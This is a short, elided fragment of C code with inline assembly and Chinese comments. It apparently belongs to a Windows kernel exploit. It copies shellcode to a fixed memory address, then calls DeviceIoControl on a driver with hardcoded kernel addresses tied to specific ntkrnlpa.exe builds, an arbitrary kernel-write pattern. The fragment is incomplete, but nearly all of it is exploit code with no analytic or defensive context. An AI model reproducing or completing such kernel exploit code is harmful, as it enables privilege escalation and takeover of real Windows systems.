...
CopyShellCode://被上面调用，复制shellcode
        ...
        mov edi,0x2E352E35//为shellcode指定的内存分配地址0x2E352E35;
        cld
    ...
    DeviceIoControl( deviceHandle, 
                     ...
                     NULL,
                     0,
                     (PVOID)0x805B80B0,//(PVOID)0x8083100C, //ntkrnlpa.exe version // (PVOID)0x80827D54,
                     0xC,
                     &dwReturnSize,  
                     NULL );
	////////////////////////////////////////////////////////////////////////////////
